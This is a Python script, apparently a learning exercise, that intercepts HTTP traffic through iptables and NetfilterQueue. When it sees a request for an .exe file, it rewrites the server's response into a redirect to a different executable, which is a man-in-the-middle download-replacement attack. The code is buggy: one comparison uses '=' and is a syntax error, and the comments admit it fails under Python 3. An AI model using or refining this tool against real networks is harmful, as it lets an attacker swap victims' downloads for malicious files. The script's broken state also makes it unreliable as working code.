#!/usr/bin/env python

#doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object

import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet

def set_iptables(): #automate setting IPtables for testing on localhost
    print("\n[+] Setting up IPTables\n")
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.call(["iptables", "--flush"])
    
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("\nHTTP Request outbound found:\n")
            print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("EXE found")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("++Replacing file")
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
                    
                    packet.set_payload(str(modified_packet))

    packet.accept() #forward packets to target, connectivity seems normal

try:
    while True:
        set_iptables()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopping file download interceptor")
    restore_iptables()
